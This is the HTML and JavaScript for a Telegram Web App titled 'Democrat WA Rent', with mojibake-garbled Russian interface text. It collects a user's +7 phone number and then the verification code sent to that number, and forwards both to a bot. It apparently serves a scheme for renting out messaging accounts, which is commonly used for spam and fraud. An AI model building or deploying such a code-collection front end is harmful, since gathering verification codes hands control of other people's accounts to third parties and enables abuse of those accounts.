<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Democrat WA Rent</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #141e30, #243b55);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 30px;
    }
    .btn, .submit-btn {
      display: block;
      width: 240px;
      padding: 15px;
      margin: 10px 0;
      font-size: 18px;
      font-weight: bold;
      text-decoration: none;
      text-align: center;
      cursor: pointer;
      color: #fff;
      background: #1d976c;
      border-radius: 12px;
      border: none;
      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
      transition: all 0.2s;
    }
    .btn:hover, .submit-btn:hover {
      background: #93f9b9;
      color: #000;
      transform: scale(1.05);
    }
    .hidden {
      display: none;
    }
    .input-box {
      margin: 10px 0;
    }
    input {
      padding: 12px;
      width: 220px;
      font-size: 16px;
      border-radius: 8px;
      border: none;
      outline: none;
    }
  </style>
</head>
<body>
  <h1>üìä –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!</h1>

  <!-- –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é -->
  <div id="menu">
    <button class="btn" onclick="sendStat()">üìà –ú–æ—è –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞</button>
    <button class="btn" onclick="openForm()">üì® –°–¥–∞—Ç—å –Ω–æ–º–µ—Ä</button>
    <button class="btn" onclick="sendMyNumbers()">üìã –ú–æ–∏ –Ω–æ–º–µ—Ä–∞</button>
  </div>

  <!-- –§–æ—Ä–º–∞ —Å–¥–∞—á–∏ –Ω–æ–º–µ—Ä–∞ -->
  <div id="form" class="hidden">
    <div class="input-box">
      <input type="text" id="phone" placeholder="+7XXXXXXXXXX">
    </div>
    <button class="submit-btn" onclick="submitPhone()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä</button>

    <div id="codeBox" class="hidden">
      <div class="input-box">
        <input type="text" id="code" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥">
      </div>
      <button class="submit-btn" onclick="submitCode()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥</button>
    </div>
  </div>

  <script>
    let tg = window.Telegram.WebApp;
    tg.expand(); // –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω

    function sendStat() {
      tg.sendData(JSON.stringify({action: "stats"}));
    }

    function sendMyNumbers() {
      tg.sendData(JSON.stringify({action: "my_numbers"}));
    }

    function openForm() {
      document.getElementById("menu").classList.add("hidden");
      document.getElementById("form").classList.remove("hidden");
    }

    function submitPhone() {
      let phone = document.getElementById("phone").value.trim();
      if (!phone.startsWith("+7") || phone.length < 11) {
        alert("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ +7XXXXXXXXXX");
        return;
      }
      tg.sendData(JSON.stringify({action: "send_number", number: phone}));

      // –æ—Ç–∫—Ä—ã–≤–∞–µ–º –≤–≤–æ–¥ –∫–æ–¥–∞
      document.getElementById("codeBox").classList.remove("hidden");
    }

    function submitCode() {
      let code = document.getElementById("code").value.trim();
      if (code.length < 3) {
        alert("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∫–æ–¥");
        return;
      }
      tg.sendData(JSON.stringify({action: "send_code", code: code}));
      alert("‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!");
      tg.close(); // –∑–∞–∫—Ä—ã—Ç—å WebApp
    }
  </script>
</body>
</html>
